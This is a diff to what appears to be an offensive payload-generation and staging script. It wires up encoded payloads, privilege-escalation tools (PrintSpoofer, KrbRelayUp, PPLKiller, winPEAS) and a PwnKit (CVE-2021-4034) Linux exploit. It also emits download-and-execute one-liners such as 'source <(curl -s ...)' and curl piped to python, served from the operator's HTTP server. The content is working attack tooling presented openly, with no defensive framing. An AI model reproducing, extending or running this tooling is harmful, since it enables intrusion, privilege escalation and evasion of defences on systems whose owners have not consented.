@@ -231,8 +231,8 @@ Ex.
     xor-eegg-cae-10 => cae(xor($buf, 'eegg'), 10)
 ''')
 parser.add_argument('--stageless', action='store_true', help='create stageless payload (no interact with this http server)')
-parser.add_argument('--csc', type=str, default='csc', help='C# compiler command')
-parser.add_argument('--gcc', type=str, default='x86_64-linux-gnu-gcc-11' if platform.uname().machine == 'aarch64' else 'gcc', help='C# compiler command')
+parser.add_argument('--csc', type=str, default='mcs', help='C# compiler command')
+parser.add_argument('--gcc', type=str, default='x86_64-linux-gnu-gcc-11' if platform.uname().machine == 'aarch64' else 'gcc', help='GNU compiler command')
 args = parser.parse_args()
 
 if args.inject.endswith('.exe'):
@@ -469,7 +469,8 @@ cs_exe('thirdparty_libs/winPEAS.exe', 'winPEAS', FILENAME='wlpc')
 cs_exe('csharp/myPsExec.exe', 'Invoke-myPsExec appsrv01 SensorDataService "powershell -c `"iwr ...`""', 'myPsExec.Program')
 cs_exe('csharp/SQL.exe', 'Invoke-SQL "<servername>" "<sql>" # separator = `n', 'SQL.SQL')
 cs_exe('thirdparty_libs/KrbRelayUp.exe', 'Invoke-KrbRelayUp')
-cs_exe(getCsExe(wlmgr.getCmd(desc2='myPrintSpoofer')), 'Invoke-PrintSpoofer # Abuse SeImpersonatePrivilege', classname='GG.GGL', funcname='Invoke-PrintSpoofer')
+if wlmgr.getCmd(desc2='myPrintSpoofer').endswith('.exe'):
+    cs_exe(getCsExe(wlmgr.getCmd(desc2='myPrintSpoofer')), 'Invoke-PrintSpoofer # Abuse SeImpersonatePrivilege', classname='GG.GGL', funcname='Invoke-PrintSpoofer')
 
 for common_psmodule in app['common-pstool']:
     c = ''
@@ -503,13 +504,12 @@ pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl 
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl + Python')
 
 # linux LPE
+with open(os.path.join(TempUtil.getTempDir(), 'llpe'), 'wb') as f:
+    f.write(ez_fit('scripts/cve-2021-4034/exp.sh', \
+        pwnkit=TempUtil.getFileUrl('scripts/cve-2021-4034/pwnkit.so'), 
+        trigger=TempUtil.getFileUrl('scripts/cve-2021-4034/trigger')
+    ))
 for dl in ['curl -s', 'wget -qO-']:
-    with open(os.path.join(TempUtil.getTempDir(), 'llpe'), 'wb') as f:
-        f.write(ez_fit('scripts/cve-2021-4034/exp.sh', \
-            pwnkit=TempUtil.getFileUrl('scripts/cve-2021-4034/pwnkit.so'), \
-            trigger=TempUtil.getFileUrl('scripts/cve-2021-4034/trigger'), \
-            use_curl=('true' if dl.startswith('curl') else 'false')
-        ))
     wlmgr.add('PolKit pkexec LPE (%s)' % dl.split()[0], 'pkexec', 'source <(%(dl)s %(base)s/%(f)s)' %  dict(base=httpUrl, f='llpe', dl=dl))
 
 pandora('ppl-1', Tvar=dict(pplkiller_dl=wlmgr.getCmd(desc1='[Simple] PPLKiller.exe')), useTransform=False, FILENAME='pk.ps1')
